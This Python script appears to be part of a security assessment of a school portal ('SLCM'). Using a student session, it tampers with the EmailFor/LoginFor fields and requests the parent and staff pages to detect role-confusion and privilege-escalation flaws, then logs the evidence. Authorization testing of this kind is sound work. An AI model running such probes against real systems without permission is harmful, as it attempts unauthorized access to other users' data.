#!/usr/bin/env python3
"""Role confusion: EmailFor/LoginFor hidden field tampering.

Method: with a STUDENT session, request pages with EmailFor/LoginFor
set to Parent and Staff values. Server must derive roles from the
session, not from posted fields; if the page content/authorization
changes with the field, that is the finding."""
import os, sys
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from common import Session, require_accounts

require_accounts()
s = Session(os.environ["SLCM_USER1"], os.environ["SLCM_PASS1"], "role-confusion")
if not s.authenticated:
    print("LOGIN FAILED; aborting")
    raise SystemExit(1)

roles = {"student": ("student", "Student"),
         "parent": ("parent", "Parent"),
         "staff": ("staff", "Staff")}

base = "/Home/Index"
for label, (ef, lf) in roles.items():
    q = f"?EmailFor={ef}&LoginFor={lf}"
    st, h, b = s.get(base + q, extra={"X-Requested-With": "XMLHttpRequest"})
    body = b.decode(errors="replace")
    admin_hint = any(w in body.lower() for w in ("staff dashboard", "faculty", "admin panel", "parent dashboard"))
    s.ev("role_tamper", role=label, st=st, size=len(b), admin_hint=admin_hint)
    print(f"[i] EmailFor/LoginFor={label} -> st={st} size={len(b)} admin_hint={admin_hint}")

# Post-login nav probe: try the parent/staff home paths with the student session
for p in ["/Parents/Home", "/Staff/Home", "/Student/Home"]:
    st, h, b = s.get(p)
    body = b.decode(errors="replace")
    gated = "login" in body[:1500].lower() or st == 302
    s.ev("role_nav", path=p, st=st, size=len(b), gated=gated)
    print(f"[i] {p} with student session -> st={st} gated={gated}")

print("DONE. Evidence: recon/authtests/role-confusion.jsonl")